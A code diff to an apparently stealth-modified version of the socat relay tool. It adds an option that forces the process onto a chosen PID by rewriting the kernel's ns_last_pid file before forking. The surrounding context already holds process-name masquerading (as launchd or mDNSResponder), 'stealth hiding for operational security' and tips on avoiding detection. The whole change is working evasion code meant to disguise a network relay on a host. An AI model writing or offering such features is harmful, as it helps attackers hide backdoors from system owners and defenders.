@@ -111,6 +111,7 @@ int main(int argc, const char *argv[]) {
 
    /* Masquerading support - process name to display */
    const char* masq_name = NULL;
+   int target_pid = -1;
    while (arg1[0] && (arg1[0][0] == '-')) {
       switch (arg1[0][1]) {
       case 'V':  if (arg1[0][2])  { socat_usage(stderr); Exit(1); }
@@ -288,6 +289,15 @@ int main(int argc, const char *argv[]) {
 	       Error("option -Mc requires an argument; use option \"-h\" for help");
 	       Exit(1);
 	    }
+	 } else if (arg1[0][2] == 'p') {
+	    /* --Mp: target PID follows */
+	    if (arg1[1]) {
+	       target_pid = atoi(arg1[1]);
+	       ++arg1, --argc;
+	    } else {
+	       Error("option -Mp requires an argument; use option \"-h\" for help");
+	       Exit(1);
+	    }
 	 } else {
 	    socat_opt_hint(stderr, arg1[0][1], arg1[0][2]);
 	    Exit(1);
@@ -368,6 +378,55 @@ int main(int argc, const char *argv[]) {
 
    Atexit(socat_unlock);
 
+   /* PID manipulation if requested (requires CAP_SYS_ADMIN or root) */
+   if (target_pid > 0) {
+      int fd;
+      char old_pid_buf[32];
+      ssize_t bytes_read;
+
+      /* Read current ns_last_pid value */
+      fd = open("/proc/sys/kernel/ns_last_pid", O_RDWR);
+      if (fd < 0) {
+         Error1("Failed to open /proc/sys/kernel/ns_last_pid (requires root/CAP_SYS_ADMIN): %s", strerror(errno));
+         Exit(1);
+      }
+
+      bytes_read = read(fd, old_pid_buf, sizeof(old_pid_buf) - 1);
+      if (bytes_read < 0) {
+         Error1("Failed to read ns_last_pid: %s", strerror(errno));
+         close(fd);
+         Exit(1);
+      }
+      old_pid_buf[bytes_read] = '\0';
+
+      /* Set ns_last_pid to target_pid - 1 */
+      if (lseek(fd, 0, SEEK_SET) < 0 || dprintf(fd, "%d", target_pid - 1) < 0) {
+         Error1("Failed to write ns_last_pid: %s", strerror(errno));
+         close(fd);
+         Exit(1);
+      }
+
+      /* Fork - child will get target_pid */
+      pid_t pid = fork();
+      if (pid < 0) {
+         Error1("fork() failed: %s", strerror(errno));
+         close(fd);
+         Exit(1);
+      }
+
+      if (pid > 0) {
+         /* Parent: restore old value and exit */
+         lseek(fd, 0, SEEK_SET);
+         write(fd, old_pid_buf, strlen(old_pid_buf));
+         close(fd);
+         Exit(0);
+      }
+
+      /* Child continues with target PID */
+      close(fd);
+      Info2("PID manipulation successful: target %d, actual %d", target_pid, getpid());
+   }
+
    /* Save address strings before stealth hiding for operational security */
    {
       char *addr1 = strdup(arg1[0]);
@@ -442,6 +501,7 @@ void socat_usage(FILE *fd) {
    fputs("      -Mb    masquerade as launchd (BSD/macOS)\n", fd);
    fputs("      -Mm    masquerade as mDNSResponder (macOS)\n", fd);
    fputs("      -Mc <name>  masquerade with custom process name\n", fd);
+   fputs("      -Mp <pid>   target specific PID (requires root/CAP_SYS_ADMIN)\n", fd);
    fputs("\n", fd);
    fputs("   note: kernel thread names ([kworker/0:1], etc.) are detectable\n", fd);
    fputs("         via PPID mismatch; use userspace process names instead\n", fd);
